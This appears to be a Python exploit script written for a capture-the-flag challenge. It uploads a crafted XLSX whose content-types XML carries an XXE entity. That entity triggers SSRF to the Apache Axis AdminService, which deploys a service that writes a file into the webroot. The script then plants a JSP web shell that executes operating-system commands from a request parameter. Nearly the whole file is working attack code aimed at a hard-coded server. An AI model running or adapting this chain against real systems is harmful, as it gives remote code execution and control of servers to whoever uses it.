#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/12/06, 22:21
"""

import requests as req
import os
import urllib.parse
import re
import string
import random
import sys

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def genExp(xml, dtd=None):
    data = '''<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
  <Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
'''
    data = '<?xml version="1.0" encoding="UTF-8"?>' + xml + data
    with open('exp/[Content_Types].xml', 'w') as f:
        f.write(data)


def upload(data):
    print("[+] Upload")
    res = req.post('http://39.98.64.24:25531/ctffffff/import',
                   data=data,
                   # proxies=proxies,
                   verify=False,
                   headers={'Content-Type': 'application/stream'})
    if res.status_code == 200:
        print(res.content)
    return False


def randomString(n=8):
    return ''.join(random.choice(string.ascii_lowercase) for x in range(n))


def post(exp):
    genExp(exp)
    os.system('rm export.xlsx')
    os.system('cd exp && zip -r ../export.xlsx *')
    with open('export.xlsx', 'rb') as f:
        pl = f.read()
        upload(pl)


PAYLOAD = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>======================================================='


def psoap(payload):
    payload = payload.strip().replace('\n', ' ')
    # print(payload)
    payload = re.sub('\s+<', '<', payload, flags=re.S)
    payload = re.sub('\s+', ' ', payload, flags=re.S)
    payload = '!-->%s' % payload[:-1]
    return payload


def url_service(url, payload, local_port=80):
    if local_port != 80:
        url += ':%d' % local_port
    return url+'/axis/services/AdminService?method=%s' % (
        urllib.parse.quote_plus(psoap(payload))
    )


def fuck(url, port, shellname='../webapps/ROOT/lfy.jsp'):
    service_name = 'Lfy'+randomString(5)+'Service'
    service_name = 'LfyectepService'
    payload = """<ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <requestFlow>
                    <handler type="RandomLog"/>
                </requestFlow>
                <ns1:parameter name="className" value="java.util.Random"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
            <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler"> 
                <parameter name="LogHandler.fileName" value="%s"/>  
                <parameter name="LogHandler.writeToConsole" value="false"/> 
            </handler> 
        </ns1:deployment>
        """ % (service_name, shellname)
    payload = """<!DOCTYPE ppp [
    <!ENTITY %% go SYSTEM "%s">
    %%go;
]>""" % url_service(url, payload, port)
    # os.system("scp x.php ctf:/tmp/x.php")
    # os.system("scp evil.dtd ctf:/tmp/evil.dtd")
    post(payload)
    print(payload)
    print(service_name)
    return service_name


def getshell(service_name, shellname='lfy.jsp', shelldata=None):
    if not shelldata:
        shelldata = PAYLOAD
    shell = '''<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:api="http://127.0.0.1/Integrics/Enswitch/API" xmlns:xsd="http://www.w3.org/2001/XMLSchema">  
  <soapenv:Body> 
    <api:main soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 
      <api:in0><![CDATA[%s]]> </api:in0> 
    </api:main> 
  </soapenv:Body> 
</soapenv:Envelope>''' % shelldata
    res = req.post("http://39.98.64.24:25531/axis/services/%s" % service_name,
                   verify=False,
                   headers={"Content-Type": "application/xml",
                            "SOAPAction": "somethi"},
                   data=shell)
    print("=" * 20)
    print(res.content)

    res = req.get("http://39.98.64.24:25531/%s" %
                  shellname, verify=False,)
    print("=" * 20)
    print(res.content)
    print(res.url)


def mmp(url, port, shellname='../webapps/ROOT/lfy.jsp'):
    # service_name = 'Lfy'+randomString(5)+'Service'
    service_name = 'LfyfileService'
    payload = """<ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <ns1:parameter name="className" value="freemarker.template.utility.Execute"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
        """ % (service_name)
    payload = """<!DOCTYPE ppp [
    <!ENTITY %% go SYSTEM "%s">
    %%go;
]>""" % url_service(url, payload, port)
    # os.system("scp x.php ctf:/tmp/x.php")
    # os.system("scp evil.dtd ctf:/tmp/evil.dtd")
    post(payload)
    print(payload)
    print(service_name)
    return service_name


if __name__ == '__main__':
    url = 'http://98531a67afd3'
    port = 8080
    shelldata = None
    shellname = randomString()+'.jsp'
    # shellname = 'catalina.policy'
    # shellpath = '/hzhz/apache-tomcat-8.5.49/conf/'
    #
    shellpath = '../webapps/axis/'
    service_name = fuck(url, port, shellpath + shellname)
    getshell(service_name, 'axis/'+shellname, shelldata)
    # service_name = mmp(url, port, shellpath + shellname)
    # getshell(service_name, shellname, 'test')
